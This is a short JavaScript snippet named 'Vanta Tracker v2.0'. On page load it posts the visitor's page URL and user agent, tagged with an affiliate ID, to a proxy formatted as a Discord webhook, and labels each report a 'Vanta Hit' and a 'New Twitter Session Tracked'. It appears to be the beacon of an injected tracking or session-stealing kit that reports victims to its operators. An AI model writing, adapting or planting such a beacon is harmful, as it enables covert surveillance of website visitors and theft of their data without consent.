(function() {
    const affId = window.V_AFF || 'Unknown';
    const proxy = window.V_PROXY;

    console.log("Vanta Initialized. Affiliate:", affId);

    async function sendToDiscord(data) {
        try {
            await fetch(proxy, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    content: `🚀 **Vanta Hit!**`,
                    embeds: [{
                        title: "New Twitter Session Tracked",
                        color: 65416, // Neon Green
                        fields: [
                            { name: "Affiliate ID", value: affId, inline: true },
                            { name: "Location", value: window.location.href, inline: true },
                            { name: "Data", value: "```" + JSON.stringify(data).substring(0, 500) + "```" }
                        ],
                        footer: { text: "Vanta Tracker v2.0" },
                        timestamp: new Date()
                    }]
                })
            });
        } catch (e) {
            console.error("Vanta Error:", e);
        }
    }

    // Trigger on load
    sendToDiscord({ status: "Active", userAgent: navigator.userAgent });

    // Custom Alert for the user to see it worked
    alert("Vanta Tracker v2.0 Connected Successfully!");
})();
